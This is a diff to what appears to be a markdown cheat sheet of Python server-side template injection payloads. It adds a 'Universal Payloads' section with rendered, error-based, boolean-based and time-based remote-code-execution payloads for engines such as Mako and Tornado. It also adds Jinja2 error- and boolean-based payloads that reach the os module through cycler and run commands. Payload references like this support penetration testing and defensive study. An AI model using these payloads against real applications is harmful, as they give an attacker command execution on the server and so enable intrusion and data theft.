@@ -5,6 +5,7 @@
 ## Summary
 
 - [Templating Libraries](#templating-libraries)
+- [Universal Payloads](#universal-payloads)
 - [Django](#django)
     - [Django - Basic Injection](#django---basic-injection)
     - [Django - Cross-Site Scripting](#django---cross-site-scripting)
@@ -37,15 +38,28 @@
 ## Templating Libraries
 
 | Template Name | Payload Format |
-| ------------ | --------- |
-| Bottle    | `{{ }}`  |
-| Chameleon | `${ }`   |
-| Cheetah   | `${ }`   |
-| Django    | `{{ }}`  |
-| Jinja2    | `{{ }}`  |
-| Mako      | `${ }`   |
-| Pystache  | `{{ }}`  |
-| Tornado   | `{{ }}`  |
+|---------------|----------------|
+| Bottle        | `{{ }}`        |
+| Chameleon     | `${ }`         |
+| Cheetah       | `${ }`         |
+| Django        | `{{ }}`        |
+| Jinja2        | `{{ }}`        |
+| Mako          | `${ }`         |
+| Pystache      | `{{ }}`        |
+| Tornado       | `{{ }}`        |
+
+## Universal Payloads
+
+Generic code injection payloads work for many Python-based template engines, such as Bottle, Chameleon, Cheetah, Mako and Tornado.
+
+To use these payloads, wrap them in the appropriate tag.
+
+```python
+__include__("os").popen("id").read() # Rendered RCE
+getattr("", "x" + __include__("os").popen("id").read()) # Error-Based RCE
+1 / (__include__("os").popen("id")._proc.wait() == 0) # Boolean-Based RCE
+__include__("os").popen("id && sleep 5").read() # Time-Based RCE
+```
 
 ## Django
 
@@ -220,6 +234,13 @@ We can use these shorter payloads from [@podalirius_](https://twitter.com/podali
 {{ namespace.__init__.__globals__.os.popen('id').read() }}
 ```
 
+Similar payloads could be used for Error-Based and Boolean-Based exploitation:
+
+```python
+{{ cycler.__init__.__globals__.__builtins__.getattr("", "x" + cycler.__init__.__globals__.os.popen('id').read()) }} # Error-Based
+{{ 1 / (cycler.__init__.__globals__.os.popen("id")._proc.wait() == 0) }} # Boolean-Based
+```
+
 With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a path to the `os` module from `lipsum`. This is the shortest payload known to achieve RCE in a Jinja2 template:
 
 ```python
@@ -303,6 +324,8 @@ Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by [@Se
 
 ## Tornado
 
+> Universal payloads also work for Tornado.
+
 ### Tornado - Basic Injection
 
 ```py
@@ -320,6 +343,8 @@ Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by [@Se
 ---
 
 ## Mako
+
+> Universal payloads also work for Mako.
 
 [Official website](https://www.makotemplates.org/)
 > Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics.
@@ -407,3 +432,4 @@ PoC :
 - [Jinja2 template injection filter bypasses - Sebastian Neef - August 28, 2017](https://0day.work/jinja2-template-injection-filter-bypasses/)
 - [Python context free payloads in Mako templates - podalirius - August 26, 2021](https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/)
 - [The minefield between syntaxes: exploiting syntax confusions in the wild - YesWeHack - October 17, 2025](https://www.yeswehack.com/learn-bug-bounty/syntax-confusion-ambiguous-parsing-exploits)
+- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 03, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
